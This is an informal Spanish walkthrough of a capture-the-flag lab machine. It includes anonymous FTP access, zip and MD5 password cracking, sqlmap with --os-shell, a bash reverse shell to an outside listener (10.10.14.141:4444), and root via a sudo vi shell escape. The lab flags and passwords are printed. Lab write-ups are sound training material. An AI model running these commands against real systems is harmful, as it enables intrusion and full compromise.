@@ -1,0 +1,89 @@
+nmap
+
+ftp abierto, sin contraseña, nos conectamos como anonymous y sin contrasseñabierto
+
+get backup.zip
+
+el .zip tiene contraseña, entonces creamos un hash con 
+
+zip2john backup.zip > hash.txt
+
+crackeamos el hash con el seclist rocku
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+y 
+
+john hash.txt --show
+
+y abrimos el .zip, al abirlo la contraseña esta encodeada en md5, lo podemos identificar con el comando hash-identifier
+
+lo crackeamos en https://crackstation.net/
+
+y nos da qwerty789
+
+
+
+accedemos a la pagina
+
+http vulnerable con 
+
+http://10.129.11.148/dashboard.php?search=nothing
+
+usamos sql para vulnerarlo, con nuestra respectiva cookie 
+
+sqlmap -u 'http://10.129.11.148/dashboard.php?search=nothing' --cookie="PHPSESSID=maim3ekuus8h4v8i1js12oppjo" --os-shell
+
+ahi nos dirigmos a donde estan los respectivas contrasñeas de la pagina en index.php
+desde la ruta /var/www/html
+
+user=postgres password=P@s5w0rd!");
+y ya que ssh esta abierto;
+
+nos conectamos desde ssh 
+y obtenemos una shell 
+luego copiamos la flag
+
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+como estamos en ssh, nos damos una shell con nc para tener mejor ejecucion de comandos
+
+
+
+os-shell> bash -c “bash -i >& /dev/tcp/10.10.14.141/4444 0>&1”
+
+
+
+
+Toca escalar privilegios, vemos usando 
+
+id 
+
+y 
+
+sudo -l 
+
+que tenemos acceso un vi, nvim o vim, 
+que los tres son lo mismo (casi)
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+no se puede hacer sudo su porque nuestro 'id'
+no tiene permisos para hacer sudo, no es un sudoer
+por ende con vi haciendo 
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+y como es igual que nvim, simplemente hacemos comando dando un root y ya
+
+:!/bin/bash
+
+whoami
+root
+
+y sacamos la flag que esta en /root/root.txt
+
+dd6e058e814260bc70e9bbdef2715849
+
+
+PWNED :DDDD
